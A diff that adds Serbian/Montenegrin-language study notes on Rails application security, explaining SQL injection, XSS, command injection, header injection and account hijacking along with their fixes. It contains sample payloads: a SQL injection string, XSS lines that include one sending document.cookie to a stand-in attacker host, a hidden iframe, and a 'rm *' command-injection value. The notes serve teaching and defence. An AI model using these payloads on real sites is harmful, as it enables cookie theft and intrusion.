@@ -177,6 +177,230 @@ send_file filename, disposition: 'inline'
 
 Alternativa je sacuvati imena fajlova u bazi, a imenovati fajlove na disku po id-jevima iz baze. Tako se sprecava i izvrsavanje koda u upload-ovanom fajlu. 
 
+# Intranet and Admin Security
+
+Interfejsi za intranet i administraciju su popularne mete napada, jer omogucavaju priviligovan pristup. Potencijalne prijetnje su Trojanci (rijetki), XSS i CSRF.
+
+XSS - Ako aplikacija ponovno prikazuje maliciozni input korisnika sa extraneta, aplikacija je potencijalno nesigurna na XSS (Cross-site scripting).
+
+- Bitno je razmisljati o najgorem scenariju: Sta ako se neko domogne cookie-ja ili akreditacije korisnika? Mogli bi kreirati uloge (roles) za admin interfejs, ili dodati specijanu login akreditaciju (credentials) drugaciju od one za javni dio aplikacije, ili specijalan password za ozbiljnije akcije.
+
+- Da li administrator stvarno mora da ima omogcen pristup sa bilo kog mjesta u svijetu? Mogli bi ograniciti login na nekoliko IP adresa. Ovo nije bas najsigurnije, a i proxy moze da pravi problem.
+
+- Staviti administratorski nterfejs na poseban sub-domain kao sto  je admin.application.com i neka to bude posebna aplikacija sa posebnim menadzmentom. Ovim se onemogucava kradja cookie-ja sa www.application.com, jer vazi same origin policy. 
+
+# User Management
+
+Dobri dodaci za Rails, kao sto su devise i authlogic, cuvaju samo sifrovane passworde.
+Svaki novi korisnik e-mail linkom dobija aktivacioni kod da aktivira nalog. Kad je aktiviran, activation_code kolona u bazi se setuje na NULL. Korisnik je sada ulogovan kao prvi aktivni korisnik pronadjen u bazi (a sanse su velike da je u pitanju administrator). Adrese:
+
+```
+http://localhost:3006/user/activate
+http://localhost:3006/user/activate?id=
+```
+
+bi omogucile pristup tom prvom korisniku. Rails izvrsava sledecu kontrolu:
+
+```
+User.find_by_activation_code(params[:id])
+```
+Evo kako SQL upit izgleda:
+
+```
+SELECT * FROM users WHERE (users.activation_code IS NULL) LIMIT 1
+```
+
+Budite na oprezu za ovakve propuste i neka dodaci budu up to date. 
 
 
+## Brute-Forcing Accounts
 
+Nije pametno imati na nekoj stranici spisak svih korisnickih imena, jer onda njih napadac moze da koristi i da im nasumicno pridruzuje password. Takodje je losa praksa prikazivati poruke tipa: "the user name you entered has not been found". Umjesto taga, uvijek koristiti genericke poruke: "username or password not correct".
+
+Pametno je i zahtijevati da se unese CAPTCHA posle nekoliko uzastopnih promasaja sa iste IP adrese. 
+
+## Account Hijacking
+### Passwords
+
+Ako je napadac ukrao cookie, ako moze lako da promijeni password, u nekoliko klikova ce hijack-ovati nalog. Zato, pri mijenjanju passworda, zahtijevati i stari password. 
+
+### E-mail
+
+Napadac moze preuzeti nalog i mijenjanjem e-mail adrese. Nakon sto je promijene, mogu otici na forgotten-password stranu i novi password ce dobiti na novoj e-mail adresi. Treba zahtijevati da se unese password pri mijenjanju e-mail adrese. 
+
+## CAPTCHA
+
+![Slika3](http://www.marketplace.org/sites/default/files/styles/primary-image-610x340/public/captcha.png?itok=U0iRBeYa)
+
+Koristi se da korisnik dokaze da je covjek, ne bot, da bi se zastitili od spam robota.
+
+Negativna CAPTCHA se koristi da se dokaze da je korisnik bot:
+
+- postavite polja forme van vidljive povrsine stranice
+- neka polja budu jako mala ili iste boje kao pozadina
+- neka polja budu prikazana, ali neka pise da ih ne treba popunjavati
+
+##  Logging
+
+Iz logova, naravno, ptreba iskljuciti passworde:
+
+```
+config.filter_parameters << :password
+```
+
+## Good Passwords
+
+Analiza 34 000 stvarnih lozinki sa MySpace-a pokazala je da je najcescih 20 passworda: password1, abc123, myspace1, password, blink182, qwerty1, ****you, 123abc, baseball1, football1, 123456, soccer, monkey1, liverpool1, princess1, jordan23, slipknot1, superman1, iloveyou1, and monkey.
+
+Svi znamo kako bi password trebalo da izgleda: da nije rijec iz recnika, da nije nikakav datum vezan za korisnika (rodjendan, godisnjica), da ima specijalne karaktere, da je dugacak, da ima velika i mala slova, brojeve i da nigdje nije zapisan.
+
+## Regularni izrazi
+
+Cesta zamka u Rails aplikacijama je match-ovanje pocetka i kraja stringa sa ^ i $ umjesto \A i \z. Prva varijanta match-uje pocetak i kraj linije, ne citavog stringa. 
+
+## Privilege Escalation
+
+Svaki parametar moze da se primijeni, bez obzira koliko ga sakrivate, a to moze biti dovoljno da korisnik izgubi pravo pristupa. Primjer: http://www.domain.com/project/1.
+
+```
+@project = Project.find(params[:id])
+```
+
+Ispravka:
+
+```
+@project = @current_user.projects.find(params[:id])
+```
+
+Ukoliko korisnik nema pravo da vidi sve projekte, koristiti drugu liniju koda.
+Pravilo: svaki korisnicki input je nesiguran dok se ne dokaze suprotno. 
+
+# Injection
+## Whitelists Vs. Blacklists
+
+Uvijek preferirajte Whitelists!
+- before_action: only [...], ne except[...]
+- ne ispravljajte neodgovarajuci korisnicki unos - odbacite ga
+
+## SQL Injection
+
+Sluzi za zaobilazenje autentifikacije. 
+
+```
+Project.where("name = '#{params[:name]}'")
+```
+
+Ako napadac doda ' OR 1 --' (-- ignorisu sve nakon toga), upit postaje:
+
+```
+SELECT * FROM projects WHERE name = '' OR 1 --'
+```
+
+I pristupice svim projektima.
+Resenje ovakvih napada je izbjegavanje je koriscenje Model.find(id) ili Model.find_by_some thing(something), a kod where upita:
+
+```
+Model.where("login = ? AND password = ?", entered_user_name, entered_password).first
+```
+ili
+```
+Model.where(login: entered_user_name, password: entered_password).first
+```
+
+## XSS (Cross-Site Scripting)
+
+XSS napadi rade na sledecem principu: napadac ubaci neki kod (injects), web aplikacija ga sacuva i kasnije prikaze na stranici. 
+
+```
+<img src=javascript:alert('Hello')>
+<table background="javascript:alert('Hello')">
+
+<script>document.write(document.cookie);</script>
+
+<script>document.write('<img src="http://www.attacker.com/' + document.cookie + '">');</script>
+
+<iframe name="StatPage" src="http://58.xx.xxx.xxx" width=5 height=5 style="display:none"></iframe>
+
+```
+50% ovakvih napada uspije!
+
+- filterisati maliciozni input (Whitelist!!)
+
+```
+tags = %w(a acronym b strong i em li ul ol h1 h2 h3 h4 h5 h6 blockquote br cite sub sup ins p)
+s = sanitize(user_input, tags: tags, attributes: %w(href title))
+```
+Drugo, dobra je praksa izbjegavanje svakog output-a aplikacije, narocito ako se prikazuje ono sto je korsnik unio. Koristimo excapeHTML() metod za mijenjanje  &, ", <, >  redom ``&amp;, &quot;, &lt;, i &gt;``. Ukoliko ste zaboravni, koristite SafeErb  plugin koji ce vas na ovo podsjecati. 
+
+## Obfuscation and Encoding Injection
+
+Unicode karakteri, koje pretrazivac obradjuje, ali aplikacija mozda ne, mogu biti prijetnja.Primjer napada:
+
+```
+IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;
+  &#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>
+#(pops up message box)
+```
+
+sanatize() ce ovo prepoznati. 
+
+## Textile Injection
+
+Ako zelimo da formatiranje teksta ne bude u HTML-u, koristimo mark-up jezik koji se, na strani servera, prevodi u HTML. Potencijalno mjesto napada. 
+
+Ovakav jezik za Ruby je RedCloth:
+
+```
+RedCloth.new('<script>alert(1)</script>').to_html
+# => "<script>alert(1)</script>"
+``` 
+
+Koristi se ``:filter_html``, da se eliminise sve sto Textile nije proizveo (mada su neke stvari dizajnom predvidjene da ostanu):
+
+```
+RedCloth.new('<script>alert(1)</script>', [:filter_html]).to_html
+# => "alert(1)"
+```
+Whitelist ce pomoci i u ovom slucaju. 
+
+## Command Line Injection
+
+Ukoliko aplikacija izvrsava neke shell komande (exec(command), syscall(command), system(command), command), treba biti oprezan jer se jedna komanda moze nadovezati na drugu uz ``|`` ili ``;``. Zastita: ``system(command, parameters)``
+
+```
+system("/bin/echo","hello; rm *")
+# prints "hello; rm *" and does not delete files
+```
+
+##  Header Injection
+
+HTTP hederi se generisu dinamicki i u nekim okolnostima mogu biti injectovani. To je lazno redirektovanje, XSS ili HTTP response splitting (nije moguce za verzije Rails 2.0.5 i kasnije).
+
+Izmedju ostalih, HTTP hederi imaju polja: Referer, User-Agent i Cookie. 
+Response heredi imaju status code, Cookie i Location (redirection target URL) polja. Svakim poljem se sa manje ili vise truda moze manipulisati, zato i njih ne zaboravite escapovati. 
+
+Kada je, na primjer, dio hedera zasnovan na korisnickom inputu, postavimo referer polje forme i redirektujemo tamo:
+```
+redirect_to params[:referer]
+```
+Prva stvar koju bi napadac uradio:
+```
+http://www.yourapplication.com/controller
+action?referer=http://www.malicious.tld
+```
+
+# Unsafe Query Generation
+
+Moguce je izvrsiti neocekivane upite ako je IS NULL u where dijelu. Primjer:
+
+```
+unless params[:token].nil?
+  user = User.find_by_token(params[:token])
+  user.reset_password!
+end
+```
+
+Ako je params[:token] jedan od: [], [nil, [nil, nil, ...] ili ['foo', nil], proci ce test; IS NULL ili IN ('foo', NULL)  where dio ce ipak biti dodan SQL upitu. 
+
+config.action_dispatch.perform_deep_munge = true
+(mijenja ove vrijednosti u nil)
